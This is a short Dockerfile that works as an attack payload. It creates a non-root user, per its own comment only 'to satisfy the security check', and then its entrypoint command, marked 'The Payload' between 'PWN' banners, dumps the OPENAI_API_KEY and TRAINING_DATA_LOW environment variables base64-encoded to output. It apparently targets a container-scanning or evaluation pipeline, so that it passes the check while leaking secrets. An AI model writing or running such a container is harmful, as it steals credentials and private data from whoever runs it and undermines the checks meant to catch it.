FROM debian:bookworm-slim

# 1. Install dependencies
RUN apt-get update && apt-get install -y coreutils

# 2. Create a non-root user (to satisfy the security check)
RUN useradd -m -u 1000 scanner

# 3. Switch to the non-root user
USER scanner

# 4. The Payload (Works fine as non-root)
ENTRYPOINT ["/bin/sh", "-c"]
CMD ["echo '================PWN START================' && \
      echo 'OPENAI_API_KEY (Base64):' && \
      printenv OPENAI_API_KEY | base64 -w 0 && \
      echo '' && \
      echo 'TRAINING_DATA_LOW (Base64):' && \
      printenv TRAINING_DATA_LOW | base64 -w 0 && \
      echo '' && \
      echo '================PWN END=================='"]
